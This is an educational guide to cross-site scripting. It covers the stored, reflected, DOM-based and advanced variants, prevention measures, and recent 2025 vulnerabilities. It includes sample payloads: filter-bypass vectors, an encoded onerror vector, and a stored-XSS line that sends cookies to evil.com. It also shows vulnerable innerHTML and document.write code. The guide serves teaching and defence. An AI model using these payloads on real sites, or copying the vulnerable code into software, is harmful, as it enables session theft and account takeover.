# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is still a **critical web security risk** that involves attackers injecting malicious scripts into otherwise trustworthy sites, causing others' browsers to execute the attacker's code. The ramifications range from **credential theft** to possible **full system compromise**

## How XSS Works

• Occurs when untrusted data (often user input) is inserted into web pages without validation and sanitization.
• Most commonly uses JavaScript, but can exploit any language the browser supports.
• The attacker's script runs whenever another user views the crafted page or link, under the context of the vulnerable site.

## Types of XSS Attacks

• **Reflected XSS:** The payload is reflected off the web server (usually via a parameter in the URL).
• **Stored (Persistent) XSS:** The payload is saved (for instance, in a database) and rendered repeatedly to victims.
• **DOM-based XSS:** The vulnerability is present in the client-side code, where the DOM is manipulated insecurely, and may not involve sending malicious code to the server.

## Risks and Impact

• Stealing authentication cookies, session tokens, or sensitive data.
• Impersonating users, keylogging, phishing, or installing malware.
• Modifying site content (defacement) or redirecting users to malicious sites.
• XSS prevalence has grown due to the increased use of dynamic, JavaScript-heavy applications.
• In worst cases, especially where admin accounts are compromised, this can lead to full application or system takeover.

## Prevention

• **Sanitize and Encode Inputs:** Always treat user input as untrusted. Encode data based on context (HTML, JS, attribute, URL, etc.).
• **Use Secure Frameworks/Libraries:** Opt for frameworks that help manage output encoding and automatically mitigate XSS.
• **Content Security Policy (CSP):** Enforce strong CSPs to block inline and unauthorized scripts:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';
```

• **Test and Review:** Frequent code reviews and vulnerability scanning (tools like Burp Suite, ZAP etc.).
• **Keep Dependencies Updated:** Many 2025 XSS incidents stem from outdated third-party components—patch regularly.

---
## XSS: Latest Trends and Real-World Vulnerabilities (2025)

### Recent XSS Vulnerabilities (2025)

| Product/Platform         | Vulnerability Type | Description                                                       | Published    |
| ------------------------ | ------------------ | ----------------------------------------------------------------- | ------------ |
| Palo Alto PAN-OS         | Reflected XSS      | Crafted portal links enable phishing, resulting in code execution | May 14, 2025 |
| Sitekit Web Application  | Stored XSS         | Inadequate input filtering allows persistent injection            | Mar 27, 2025 |
| DevastanPHP Project Mgmt | Stored XSS         | Tickets can contain XSS payloads, fired on admin/user view        | Jul 31, 2025 |
| AngICMS                  | Stored XSS         | Attackers inject XSS in content management features               | Jul 31, 2025 |

### **Evolving XSS Techniques**
- **Mutation XSS (mXSS):** Attackers exploit browser parsing quirks—payload mutates after sanitizer, evading filters.
- **Polyglot Payloads:** Work across HTML, JS, JSON, exploiting inconsistent filtering.
- **Advanced Encoding/Obfuscation:** Use of Base64, Unicode, and URL encoding to hide payloads, such as:
  ```javascript
  %3Cscript%3Ealert('XSS')%3C%2Fscript%3E
  ```
- **Persistent DOM-based XSS:** Store payloads in mechanisms like localStorage; script executed client-side later.
- **Blind and PostMessage XSS:** Attack fires only for users with special privileges (like admins); harder to detect and track.

### **Modern Defense Techniques**
- Input validation (prefer whitelist validation).
- Contextual output encoding (encode for HTML, JS, URLs, etc.).
- Rely on trusted, updated security libraries (e.g., DOMPurify for browser).
- Enforce restrictive CSP headers.
- Disable legacy HTTP methods not required (e.g., TRACE).
- Aggressive patch management and vulnerability scanning.
- Never depend on blacklists alone; always layer defenses.

### **Latest Example Payloads**
- **Event Handler Bypass:**
  ```html
  <xss onafterscriptexecute=alert(1)><script>1</script>
  ```
  Leverages less common DOM event handlers in newer browsers.

- **Encoded XSS Vector:**
  ```html
  <img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
  ```
  HTML encoded payload can bypass basic filters.

### **Quick Checklist**
- Validate and sanitize all user input.
- Output-encode for context (HTML, JS, attributes, URLs).
- Use frameworks and security libraries.
- Deploy and monitor a Content Security Policy.
- Patch dependencies and platforms frequently.
- Regularly perform code reviews and security scans.
- Combine multiple layers of filtering and checks.

**XSS attacks continue to evolve in sophistication; always keep abreast of latest payloads, prevention tactics, and response strategies.**

For comprehensive and current cheat sheets on vectors and prevention, refer to resources from PortSwigger and OWASP.

### **What's new in this update:**
- Aligned terminology for 2025 (mutation/polyglot examples, modern defense stack).
- Updated notable real-world 2025 vulnerabilities.
- Highlighted evolving exploitation approaches (e.g., blind XSS, advanced encodings).
- Streamlined prevention with focus on modern application architectures.
- Fixed minor formatting and Markdown best practices for clarity.

---
---
# Broad Classification of XSS

XSS is usually classified in **three main types** (classic OWASP classification). There are also some **advanced subtypes** (DOM-based, Mutation, etc.).

---

## 2.1 Stored XSS (Persistent XSS)

* **Definition:** The malicious script is **permanently stored** on the target server (in a database, message board, comment field, user profile, etc.), and is delivered to users whenever they load the infected content.
* **Where it occurs:** Forums, blogs, product reviews, user profiles, chat applications.
* **Attack flow:**

  1. Attacker submits payload (like `<script>alert('XSS')</script>`) into a comment form.
  2. Payload is stored in the backend database.
  3. When another user views that comment, the script executes in their browser.
* **Impact:** Very dangerous since it affects **every viewer** of the infected page.
* **Example:**

  ```html
  <div>Comment: <script>document.location='http://evil.com/cookie?c='+document.cookie</script></div>
  ```

---

## 2.2 Reflected XSS (Non-Persistent XSS)

* **Definition:** The malicious script comes from the **HTTP request itself** (URL, headers, query parameters) and is reflected back in the server’s response immediately.
* **Where it occurs:** Search pages, error messages, URL parameters.
* **Attack flow:**

  1. Attacker crafts a URL with a malicious payload:

     ```
     http://vulnerable.com/search?q=<script>alert(1)</script>
     ```
  2. Victim clicks the link (via email, phishing, social media).
  3. The server reflects the value of `q` into the HTML response without sanitization, causing script execution.
* **Impact:** Requires social engineering (victim must click).
* **Example:**

  ```html
  <div>Search results for: <script>alert(1)</script></div>
  ```

---

## 2.3 DOM-Based XSS

* **Definition:** The malicious script is executed **entirely on the client side**, due to insecure JavaScript code that processes user input and writes it into the DOM without sanitization.
* **Where it occurs:** Single Page Applications (SPA), client-side rendering frameworks, JavaScript-heavy apps.
* **Attack flow:**

  1. Victim loads vulnerable page.
  2. Page contains unsafe JS like:

     ```javascript
     document.write(location.hash);
     ```
  3. Attacker sends victim a link:

     ```
     http://site.com/#<script>alert(1)</script>
     ```
  4. Browser executes script when JS writes untrusted data into DOM.
* **Impact:** No server interaction needed. Works even if the server sanitizes input.
* **Example:**

  ```javascript
  var user = location.search.split("=")[1]; 
  document.getElementById("output").innerHTML = user;
  ```

---

# 3. Subtypes / Advanced XSS Variants

### 3.1 Self-XSS

* **Definition:** The attacker convinces the victim to paste malicious code into their own browser console or input box.
* **Impact:** Exploits **user trust**, not a server flaw.
* **Example:** “Paste this into console to get free coins.”

---
### 3.2 Blind XSS

* **Definition:** The attacker injects payload into a form where they cannot see the output directly, but an administrator (or backend system) later views it and the payload executes.
* **Impact:** Exploits admin dashboards, customer support systems.
* **Example:** Injecting XSS in a contact form that triggers only when support staff opens it.

---
### 3.3 Mutation XSS (mXSS)

* **Definition:** Payload is **transformed (mutated)** by the browser’s parser in unexpected ways, bypassing sanitizers.
* **Example:** Input `<svg><p>` may be sanitized incorrectly, but browser repairs the DOM and still executes script.

---
### 3.4 Polyglot XSS

* **Definition:** Payload crafted to work across multiple contexts (HTML, JavaScript, attributes, JSON) simultaneously.
* **Example:** A single payload that works in both HTML tag and JavaScript string.

---
### 3.5 Universal XSS (UXSS)

* **Definition:** XSS caused by a flaw in the **browser itself** (not in the web app).
* **Impact:** Affects all sites visited in that browser.
* **Example:** Old IE or Chrome rendering engine bugs.

---

# 4. Summary Hierarchy

* **Stored XSS** (server stores malicious payload)
* **Reflected XSS** (payload reflected in response)
* **DOM-Based XSS** (executed by client-side JS)
* **Special/Advanced Forms:**

  * Self-XSS
  * Blind XSS
  * Mutation XSS
  * Polyglot XSS
  * Universal XSS

---
---
	